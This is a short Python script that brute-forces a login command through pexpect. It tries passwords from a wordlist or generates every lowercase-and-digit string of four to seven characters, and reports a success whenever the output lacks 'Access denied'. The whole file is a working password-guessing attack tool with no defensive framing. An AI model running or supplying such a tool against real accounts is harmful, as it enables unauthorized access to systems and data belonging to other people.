import pexpect
import sys
import time
import string
import itertools


try:
  login_command = sys.argv[1]
  flags = sys.argv[2]
  if flags == "-D":
    filename = sys.argv[3]
except:
  print("please enter the right command")

if flags == "-D":
  file = open(filename, 'r')
  passwords = file.readlines()

  for password in passwords:
      result = pexpect.run(login_command + password, 2)
      result = result.decode("utf-8")
      if result.find('Access denied') != -1:
        print("[*] " + password.strip() + " |  failed")
      else:
        print("[*] " + password.strip() + " |  success")
        break

  file.close()
elif flags == "-B":
  is_found = False
  chars = string.ascii_lowercase + string.digits
  for password_length in range(4,8):
    for guess in itertools.product(chars, repeat=password_length):
      guess = ''.join(guess)
      if guess == "":
        continue
      result = pexpect.run(login_command + guess, 2)
      result = result.decode("utf-8")
      if result.find('Access denied') != -1:
        print("[*] " + guess + " |  failed")
      else:
        print("[*] " + guess + " |  success")
        is_found = True
        break
    if is_found:
      break

